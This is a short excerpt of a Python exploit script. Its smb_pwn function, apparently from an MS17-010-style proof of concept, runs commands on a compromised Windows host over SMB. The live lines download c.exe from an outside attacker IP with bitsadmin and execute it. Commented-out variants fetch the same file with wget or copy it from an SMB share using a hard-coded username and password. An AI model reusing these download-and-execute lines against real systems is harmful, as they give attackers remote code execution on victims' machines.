...
def smb_pwn(conn, arch):
	...
	#smb_send_file(smbConn, sys.argv[0], 'C', '/c.exe')
	#service_exec(conn, r'cmd /c wget http://192.168.45.243/c.exe -O C:\c.exe')
	service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://192.168.45.243/c.exe C:\c.exe')
	#service_exec(conn, r'cmd /c net use \\192.168.45.243\tools /user:chacei asdf')
	#service_exec(conn, r'cmd /c copy \\192.168.45.243\tools\c.exe C:\c.exe')
	service_exec(conn, r'cmd /c /c.exe')
